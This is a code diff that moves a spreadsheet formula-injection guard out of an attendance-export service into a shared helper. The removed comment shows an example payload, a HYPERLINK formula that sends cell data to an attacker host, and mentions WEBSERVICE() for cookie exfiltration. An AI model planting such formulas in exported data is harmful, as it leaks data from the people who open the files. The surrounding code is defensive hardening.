@@ -13,6 +13,7 @@ const { toVN } = require('../helpers/dayjsConfig');
 // ──────────────────────────────────────────────────────────
 
 const { ServiceError } = require('../helpers/ServiceError');
+const { safeCell } = require('../helpers/excel-formula-guard');
 
 // Map status code → Vietnamese text
 const STATUS_TEXT = {
@@ -47,30 +48,9 @@ const enforceRowCap = (recordCount /* eslint-disable-line no-unused-vars */, kin
   }
 };
 
-// ──────────────────────────────────────────────────────────
-// CSV / XLSX formula injection guard (audit PR 4 — SEC-004)
-// ──────────────────────────────────────────────────────────
-// Spreadsheet apps (Excel, LibreOffice, Google Sheets when downloading)
-// evaluate cells whose value STARTS with `= + - @ \t \r` as a formula.
-// A user-controlled field like
-//   name = '=HYPERLINK("http://attacker.tld/x?u="&A2,"Click")'
-// is harmless in the web UI but auto-executes when an HR admin opens
-// the exported .xlsx on Windows. WEBSERVICE() / external lookup gives
-// the attacker outbound traffic + cookie exfil.
-//
-// Defence: prepend a single apostrophe so Excel treats the value as a
-// literal string. The apostrophe itself is not displayed but is preserved
-// on round-trip. Apply to EVERY user-controlled string that lands in a
-// cell: name, department, teacherComment, remark, classCode, courseName,
-// teamName, level, empCode, status text.
-//
-// Numbers and dates pass through untouched.
-// ──────────────────────────────────────────────────────────
-const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
-const safeCell = (value) => {
-  if (typeof value !== 'string') return value;
-  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
-};
+// CSV / XLSX formula-injection guard (audit PR 4 — SEC-004). The `safeCell`
+// primitive now lives in helpers/excel-formula-guard.js (shared with the
+// learning reports export, re-exported below for back-compat).
 
 /**
  * Build the aggregation pipeline to join Attendance with
